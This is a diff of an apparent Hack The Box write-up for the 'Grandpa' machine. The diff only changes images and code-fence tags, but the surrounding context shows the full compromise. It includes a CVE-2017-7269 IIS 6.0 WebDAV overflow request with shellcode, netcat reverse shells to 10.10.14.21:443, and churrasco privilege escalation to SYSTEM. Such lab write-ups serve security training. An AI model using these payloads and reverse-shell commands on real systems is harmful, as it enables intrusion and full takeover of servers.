@@ -5,7 +5,7 @@ excerpt: "Grandpa is a quick and fun easy box where're goint to exploit Microsof
 date: 2023-01-12
 classes: wide
 header:
-  teaser: /assets/images/htb-writeup-grandpa/grandpa_logo.png
+  teaser: /assets/images/htb-writeup-grandpa/new.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
@@ -15,13 +15,17 @@ tags:
   - Buffer Overflow
   - Token Kidnapping
 ---
-![](/assets/images/htb-writeup-grandpa/grandpa_logo.png)
+
+<p align="center">
+<img src="/assets/images/htb-writeup-grandpa/grandpa_logo.png">
+</p>
+
 
 Grandpa is a quick and fun easy windows box where're going to exploit the Microsoft IIS 6.0 with a Remote buffer overflow script and also we're use the churrasco script to be nt authority\system
 
 ## Port Scan 
 
-```
+```bash
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-12 13:19 CST
 Nmap scan report for 10.10.10.14
 Host is up (0.18s latency).
@@ -51,7 +55,7 @@ If we check the latest version of IIS is the 10.0 and the machine have 6.0 that 
 
 We're going to use this tool to enumerate the webdav
 
-```
+```bash
 ❯ davtest -url http://10.10.10.14
 ********************************************************
  Testing DAV connection
@@ -79,7 +83,7 @@ PUT	cgi	FAIL
 /usr/bin/davtest Summary:
 ```
 
-```
+```bash
 ❯ curl -s -X OPTIONS "http://10.10.10.14" -I
 HTTP/1.1 200 OK
 Date: Thu, 12 Jan 2023 19:41:42 GMT
@@ -100,7 +104,7 @@ Cache-Control: private
 
 If we search in searchsploit we found this
 
-```
+```bash
 ❯ searchsploit iis 6.0
 ---------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                |  Path
@@ -124,7 +128,7 @@ Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow        
 
 Copy the url and search on google or another browser you want
 
-```
+```bash
 ❯ searchsploit -m windows/remote/41738.py
   Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
       URL: https://www.exploit-db.com/exploits/41738
@@ -136,7 +140,7 @@ After copy the CVE and search in Github we're goint to use this exploit
 
 - [https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)
 
-```
+```bash
 ❯ git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
 Clonando en 'iis6-exploit-2017-CVE-2017-7269'...
 remote: Enumerating objects: 6, done.
@@ -154,14 +158,14 @@ Recibiendo objetos: 100% (6/6), listo.
 
 Ok now the script is in python2 
 
-```
+```bash
 ❯ python2 exploit.py
 usage:iis6webdav.py targetip targetport reverseip reverseport
 ```
 
 We can sent a reverse shell 
 
-```
+```bash
 ❯ python2 exploit.py 10.10.10.14 80 10.10.14.21 443
 PROPFIND / HTTP/1.1
 Host: localhost
@@ -169,7 +173,7 @@ Content-Length: 1744
 If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
 ```
 
-```
+```bash
 ❯ rlwrap nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.14.21] from (UNKNOWN) [10.10.10.14] 1030
@@ -185,7 +189,7 @@ c:\windows\system32\inetsrv>
 
 I can't enter in the Harry directory
 
-```
+```bash
 cd C:\
 cd C:\
 
@@ -231,7 +235,7 @@ C:\DOCUME~1>
 
 We have the SeImpersonatePrivilege 
 
-```
+```bash
 whoami /priv
 whoami /priv
 
@@ -252,7 +256,7 @@ C:\DOCUME~1>
 
 In this case you use the Juicy-potato script but in this machine don't work because we have a problem with the CLSID of the machine 
 
-```
+```bash
 systeminfo
 
 Host Name:                 GRANPA
@@ -261,7 +265,7 @@ OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
 
 The Github of juicy-potato only works with this versions
 
-```
+```bash
 Windows CLSID
 Windows 7 Enterprise
 Windows 8.1 Enterprise
@@ -278,14 +282,14 @@ When you have this problem only use churrasco.exe you have information here
 
 First Download churrasco from the web 
 
-```
+```bash
 ❯ ls
  iis6-exploit-2017-CVE-2017-7269   churrasco.exe
 ```
 
 Now trasnfer to the machine 
 
-```
+```bash
 ❯ impacket-smbserver smbFolder $(pwd) -smb2support
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -297,7 +301,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 ```
 
-```
+```bash
 dir \\10.10.14.21\smbFolder\
 dir \\10.10.14.21\smbFolder\
  Volume in drive \\10.10.14.21\smbFolder has no label.
@@ -317,7 +321,7 @@ C:\DOCUME~1>
 
 Move the churrasco to Temp directory
 
-```
+```bash
 cd C:\Windows\Temp
 
 copy \\10.10.14.21\smbFolder\churrasco.exe churrasco.exe
@@ -347,7 +351,7 @@ C:\WINDOWS\Temp>
 
 If you run the script see who we are
 
-```
+```bash
 .\churrasco.exe "whoami"
 .\churrasco.exe "whoami"
 nt authority\system
@@ -359,20 +363,20 @@ C:\WINDOWS\Temp>
 
 We want a reverse shell so we need netcat so transfer to the machine
 
-```
+```bash
 locate nc.exe
 ```
 
 And copy the nc.exe to your current file
 
-```
+```bash
 ❯ ls
  nc.exe
 ```
 
 With the same tool transfer to the machine
 
-```
+```bash
 ❯ impacket-smbserver smbFolder $(pwd) -smb2support
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -386,12 +390,12 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 Use rlwrap right now to receive only the shell
 
-```
+```bash
 ❯ rlwrap nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-```
+```bash
 copy "\\10.10.14.21\smbFolder\nc.exe"
 copy "\\10.10.14.21\smbFolder\nc.exe"
         1 file(s) copied.
@@ -420,7 +424,7 @@ C:\WINDOWS\Temp>
 
 Exucute this
 
-```
+```bash
 churrasco.exe -d "C:\WINDOWS\TEMP\nc.exe 10.10.14.21 443 -e cmd.exe"
 churrasco.exe -d "C:\WINDOWS\TEMP\nc.exe 10.10.14.21 443 -e cmd.exe"
 No
@@ -451,7 +455,7 @@ C:\WINDOWS\TEMP>
 
 I had mistakes when I execute churrasco but I recive the shell
 
-```
+```bash
 ❯ rlwrap nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.14.21] from (UNKNOWN) [10.10.10.14] 1047
@@ -469,7 +473,7 @@ C:\WINDOWS\TEMP>
 
 You can enter in harry's directory
 
-```
+```bash
 cd Desktop
 
 type user.txt
@@ -480,7 +484,7 @@ C:\DOCUME~1\Harry\Desktop>
 
 ## Root Flag
 
-```
+```bash
  Directory of C:\DOCUME~1\Administrator\Desktop
 
 04/12/2017  04:28 PM    <DIR>          .
